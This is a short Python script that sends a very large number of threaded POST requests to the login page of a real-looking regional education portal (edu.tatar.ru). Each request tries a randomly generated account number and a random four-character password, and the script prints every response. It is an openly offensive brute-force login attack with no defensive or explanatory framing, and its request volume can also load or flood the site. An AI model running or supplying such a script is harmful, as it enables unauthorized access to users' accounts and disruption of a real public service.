import threading
import time
import requests
import random
pop = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
       'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
def heavy(n, i, thead):
    for x in range(1, n):
        for y in range(1, n):
            hui = {'main_login2': f'46{random.randint(10000000, 99999999)}',
                   'main_password2': f'{random.choice(pop)}{random.choice(pop)}{random.choice(pop)}{random.choice(pop)}'}
            q = requests.post(r'https://edu.tatar.ru/logon', hui)
            print(q.status_code)
            print(q.text)
def sequential(calc, thead):
    for i in range(calc):
        heavy(500, i, thead)


def threaded(theads, calc):
    threads = []
    for thead in range(theads):
        t = threading.Thread(target=sequential, args=(calc, thead))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    threaded(4, 20)